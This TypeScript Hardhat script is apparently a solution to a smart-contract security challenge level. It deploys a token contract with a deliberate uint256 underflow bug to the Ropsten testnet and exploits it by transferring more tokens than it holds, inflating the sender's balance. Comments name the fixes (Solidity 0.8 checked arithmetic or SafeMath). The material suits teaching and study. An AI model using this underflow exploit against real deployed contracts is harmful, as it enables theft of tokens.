import { ethers } from "hardhat";
import { getSigner } from "../utils/walletProvider";
import * as Lvl5 from "../../artifacts/contracts/lvl5/Lvl5.sol/Lvl5.json";
import dotenv from "dotenv";

dotenv.config();

/**
 * The vulnerability in level 5 resides in an underflow problem.
 * If we provide a value X that is > 20, the substraction of 20 - X puts it back at the maximum value the uint256 type allows
 * which is 2**256 – 1.
 *
 * This script deploys the faulted contract on Ropsten network and exploits it.
 *
 * To solve it, you can either use:
 * 1. Use solidity version ^0.8.0 which reverts automatically on underflow/overflow arithmetic operations
 * 2. OpenZeppelin's SafeMath library
 */
async function main() {
  // Default address used for tests with Hardhat, will be used for the recipient address
  const HARDHAT_TESTING_ADDRESS = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266";

  const signer = getSigner();
  const signerAddress = signer.getAddress();

  const contractFactory = new ethers.ContractFactory(
    Lvl5.abi,
    Lvl5.bytecode,
    signer
  );

  console.log("Deploying contract...");
  const contract = await contractFactory.deploy(20);
  console.log("Awaiting confirmations...");
  await contract.deployed();
  console.log(`Contract deployed at ${contract.address}`);

  const previousSignerBalance = await contract.balanceOf(signerAddress);
  console.log(`Previous wallet balance : ${previousSignerBalance} tokens.`);

  console.log("Exploiting contract with underflow...");
  const exploitTx = await contract.transfer(HARDHAT_TESTING_ADDRESS, 21);
  await exploitTx.wait();

  const newSignerBalance = await contract.balanceOf(signerAddress);
  console.log("Exploited.");
  console.log(`New wallet balance : ${newSignerBalance} tokens.`);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
